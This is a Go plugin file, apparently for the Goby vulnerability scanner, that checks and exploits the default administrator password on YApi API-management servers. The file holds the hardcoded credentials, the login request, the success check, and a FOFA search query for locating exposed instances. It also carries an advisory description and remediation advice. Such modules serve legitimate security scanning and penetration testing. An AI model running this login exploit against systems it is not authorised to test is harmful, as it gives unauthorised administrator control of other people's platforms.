package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "YApi /login Default Password Vulnerability",
    "Description": "<p>YApi is an efficient, easy-to-use, and powerful api management platform designed to provide more elegant interface management services for developers, products, and testers. It can help developers easily create, publish and maintain apis. YApi also provides excellent interactive experience for users. Developers only need to use the interface data writing tools provided by the platform and simple click operations to achieve interface management.</p><p> An attacker can control the entire platform through the default password vulnerability, using administrator rights to operate core functions.</p>",
    "Product": "YApi",
    "Homepage": "https://yapi.pro/",
    "DisclosureDate": "2022-07-15",
    "PostTime": "2024-07-15",
    "Author": "1215816861@qq.com",
    "FofaQuery": "title=\"YApi\" && body=\"yapi\"",
    "GobyQuery": "title=\"YApi\" && body=\"yapi\"",
    "Level": "2",
    "Impact": "<p>An attacker can control the entire platform through the default password vulnerability, using administrator rights to operate core functions.</p>",
    "Recommendation": "<p>1. Change the default password. The password must contain more than eight characters, including uppercase and lowercase letters, digits, and special characters. </p><p> 2. Disable the public network from accessing the system if necessary. </p><p> 3. Configure access policies and whitelist access on security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/user/login",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Content-Type": "application/json;charset=UTF-8"
                },
                "data_type": "text",
                "data": "{\"email\":\"admin@admin.com\",\"password\":\"ymfe.org\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "admin@admin.com",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/user/login",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Content-Type": "application/json;charset=UTF-8"
                },
                "data_type": "text",
                "data": "{\"email\":\"admin@admin.com\",\"password\":\"ymfe.org\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "admin@admin.com",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "YApi /login 默认口令漏洞",
            "Product": "YApi",
            "Description": "<p>YApi 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。<br></p><p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>1.修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2.如非必要，禁止公网访问该系统。</p><p>3.通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "YApi /login Default Password Vulnerability",
            "Product": "YApi",
            "Description": "<p>YApi is an efficient, easy-to-use, and powerful api management platform designed to provide more elegant interface management services for developers, products, and testers. It can help developers easily create, publish and maintain apis. YApi also provides excellent interactive experience for users. Developers only need to use the interface data writing tools provided by the platform and simple click operations to achieve interface management.</p><p>&nbsp;An attacker can control the entire platform through the default password vulnerability, using administrator rights to operate core functions.<br></p>",
            "Recommendation": "<p>1. Change the default password. The password must contain more than eight characters, including uppercase and lowercase letters, digits, and special characters.&nbsp;</p><p>&nbsp;2. Disable the public network from accessing the system if necessary.&nbsp;</p><p>&nbsp;3. Configure access policies and whitelist access on security devices such as firewalls.<br></p>",
            "Impact": "<p>An attacker can control the entire platform through the default password vulnerability, using administrator rights to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10972"
}`

  sendPayloadAAAA_fsdf158a6f05vsa97s4f := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
    setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string ,data string, head map[string]string) (*httpclient.HttpResponse, error) {
      PostRequest := httpclient.NewPostRequestConfig(urlGet)
      PostRequest.Timeout = 15
      PostRequest.VerifyTls = false
      PostRequest.FollowRedirect = false
      for headName, headValue := range head {
        PostRequest.Header.Store(headName, headValue)
      }
      PostRequest.Data=data
      return httpclient.DoHttpRequest(hostInfo, PostRequest)
    }
  
    header := map[string]string{
      "User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
      "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
      "Accept-Language": "zh-CN,zh;q=0.9",
      "Content-Type":    "application/json;charset=UTF-8",
    }

    
    // 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
    // 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
    // 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
    vulInfo := `admin@admin.com:ymfe.org`
    vulPath := `/api/user/login`
    loginPath := `/login`
    data :=`{"email":"admin@admin.com","password":"ymfe.org"}`

    resp, err := setPostRequest(hostInfo,vulPath, data, header)
    if err != nil {
      return false,vulInfo, loginPath
    }
    if  resp.StatusCode == 200 && strings.Contains(resp.RawBody,`admin@admin.com`) {
      return true, vulInfo, loginPath
    }
    

    return false, vulInfo, loginPath
  }
  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      // 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
      respBool, vulInfo, vulPath := sendPayloadAAAA_fsdf158a6f05vsa97s4f(hostInfo)

      // --------------------------------------------------
      // 请注意，后续为模板内容，正常情况下无需修改
      if respBool {
        ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
        return true
      }
      return false
    },
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      // 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

      // --------------------------------------------------
      // 请注意，后续为模板内容，正常情况下无需修改
      _, vulInfo, _ := sendPayloadAAAA_fsdf158a6f05vsa97s4f(expResult.HostInfo)
      expResult.Output = `Please use "` + vulInfo + `" to login`
      expResult.Success = true
      return expResult
    },
  ))
}